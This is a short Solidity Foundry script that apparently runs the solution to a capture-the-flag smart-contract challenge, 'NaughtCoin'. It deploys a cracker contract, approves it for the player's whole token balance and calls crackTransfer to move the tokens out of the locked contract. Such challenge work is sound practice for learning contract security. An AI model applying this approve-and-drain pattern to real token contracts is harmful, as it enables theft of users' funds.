pragma solidity >=0.4.22 <0.9.0;
import "../lib/forge-std/src/Script.sol";
import "../src/Solutions/NaughtCracker.sol";
import "../lib/forge-std/src/console.sol";
import "../src/Challenge/NaughtCoin.sol";

contract NaughtCrackRunner is Script {
    NaughtCracker naughtCracker;
    NaughtCoin naughtCoin;

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        //enter contract address here
        naughtCoin = NaughtCoin(0xC43E9A0A23d2a3d9BE2cC212b836f7067A0B4E14);
        naughtCracker = new NaughtCracker(address(naughtCoin));

        //enter player address here
        address player = 0xec485e125D83C45cdCC734A7386A49ba994dFc1d;
        uint256 amount = naughtCoin.balanceOf(player);
        naughtCoin.approve(address(naughtCracker), amount);
        naughtCracker.crackTransfer(player);

        uint256 amount2 = naughtCoin.balanceOf(address(naughtCracker));
        console.log(amount2);

        vm.stopBroadcast();
    }
}
